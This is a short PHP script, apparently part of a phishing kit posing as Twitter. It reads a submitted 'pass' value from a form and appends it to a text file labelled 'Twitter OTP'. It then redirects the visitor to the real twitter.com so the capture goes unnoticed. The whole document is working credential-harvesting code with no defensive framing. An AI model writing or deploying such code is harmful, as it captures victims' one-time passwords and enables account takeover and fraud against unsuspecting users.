<?php
file_put_contents("otp.txt", "Twitter OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://twitter.com/');
?>
